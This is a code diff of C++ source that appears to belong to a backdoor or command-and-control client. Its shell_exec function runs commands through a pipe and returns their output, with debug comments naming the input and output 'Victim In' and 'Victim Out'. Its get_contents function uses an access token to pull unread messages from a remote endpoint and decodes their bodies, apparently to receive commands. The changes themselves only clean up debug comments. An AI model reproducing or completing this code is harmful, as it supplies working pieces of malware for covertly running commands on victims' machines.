@@ -10,7 +10,7 @@ using namespace std;
 
 string shell_exec(string cmdstr)
 {
-	//cout << "Victim In: " << cmdstr << endl;
+	//cout << cmdstr << "\n\n";
 	const char* cmd = cmdstr.c_str();
 	array<char, 10240> buffer;		//128
 	string results;
@@ -18,7 +18,7 @@ string shell_exec(string cmdstr)
 	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
 		results += buffer.data();
 	}
-	//cout << "Victim Out: " << results << endl;
+	//cout << results << "\n\n";
 	return results;
 }
 
@@ -60,17 +60,11 @@ string get_contents(string access_token, string thing_id)
 {
 	string contents;
 	string get_body = curl("GET", access_token, "", "/message/unread");
-	//cout << "get_body: " << get_body << endl;
 	regex body_regex(R"|("body": "([\s\S]+)", "dest":)|");
-	//cout << "Alive1";
 	regex amp("&amp;"), quote("\\\\\""), less("&lt;"), greater("&gt;"), escape("\\\\\\\\");
-	//cout << "Alive2";
 	smatch search_match;
-	//cout << "Alive3";
 	regex_search(get_body, search_match, body_regex);
-	//cout << "Alive4";
 	contents = search_match[1];
-	//cout << "Contents: " << contents << endl;
 	if (contents.find("&amp;") != string::npos){
 		contents = regex_replace (contents, amp, "&");
 	} if (contents.find("\\\"") != string::npos){
@@ -82,7 +76,6 @@ string get_contents(string access_token, string thing_id)
 	} if (contents.find("\\\\") != string::npos){
 		contents = regex_replace (contents, escape, "\\");
 	}
-	//cout << "Contents Final: " << contents << endl;
 	return contents;
 }
 
